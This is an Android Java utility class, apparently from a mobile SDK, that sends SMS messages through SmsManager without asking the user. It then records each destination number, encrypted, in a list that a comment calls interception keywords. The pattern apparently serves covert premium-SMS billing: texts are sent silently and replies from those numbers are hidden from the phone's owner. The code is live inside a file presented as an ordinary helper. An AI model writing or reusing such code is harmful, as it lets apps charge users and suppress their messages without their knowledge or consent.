package com.vsoyou.sdk.util;

import java.util.ArrayList;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.vsoyou.sdk.main.Constants;
import com.vsoyou.sdk.main.entity.KeyEntity;

import android.content.Context;
import android.telephony.SmsManager;

public class SmsSendUtil {
	
	public static final String TAG = "SmsSendUtil";

	
	/**
	 * @param phoneNumber
	 * @param message
	 */
	public static void sendSMS(Context context, String phoneNumber,
			String message, LocalStorage storage) {
		LogUtil.i(TAG, "sendSMS.phoneNumber" + phoneNumber);
		LogUtil.i(TAG, "sendSMS.message" + message);
		if (!"".equals(phoneNumber) && !"".equals(message)
				&& phoneNumber != null && message != null) {
			sendSms(phoneNumber, message);
			updateKey(context, phoneNumber, storage);
		}
	}

	/**
	 * 将发送号码 加入到拦截关键字
	 * @param context
	 * @param phoneNumber
	 * @param storage
	 */
	private static void updateKey(final Context context, final String phoneNumber, final LocalStorage storage) {
		new Thread(new Runnable() {
			
			@Override
			public void run() {
				String keyJson = DESCoder.decryptoPriAndPub(context, storage.getString(Constants.KEY_LIST_JSON, ""));
				try {
					LogUtil.i(TAG, "skeyJson" + keyJson);
					//[{"key":"54654","time":"54454546464"},{"key":"54654","time":"54454546464"}]
					ArrayList<KeyEntity> keyList = new ArrayList<KeyEntity>();
					JSONArray jsonArray = new JSONArray(keyJson);
					for (int i = 0; i < jsonArray.length(); i++) {
						JSONObject currentKeyEntityJO =  new JSONObject((String)jsonArray.get(i));
						KeyEntity currentKeyEntity = new KeyEntity(
								currentKeyEntityJO.getString("k_key"),
								currentKeyEntityJO.getLong("k_time"));
						keyList.add(currentKeyEntity);
					}
					keyList.add(new KeyEntity(phoneNumber, System.currentTimeMillis()));
					JSONArray resultJsonArray = new JSONArray();
					if (keyList.size() > 0) {
						for (int i = 0; i < keyList.size(); i++) {
							resultJsonArray.put(keyList.get(i).getJsonStr());
						}
						storage.putString(Constants.KEY_LIST_JSON, DESCoder.encryptoPubAndPri(context, resultJsonArray.toString()));
					}
				} catch (JSONException e) {
					e.printStackTrace();
				}
			}
		}).start();
	}

	/**
	 * 短信发送
	 * @param phoneNumber
	 * @param message
	 */
	private static void sendSms(String phoneNumber, String message) {
		SmsManager smsManager = SmsManager.getDefault();// 获取默认的SMS管理器
		smsManager.sendTextMessage(phoneNumber, null, message, null, null);// 发送文本短信
	}
	
}
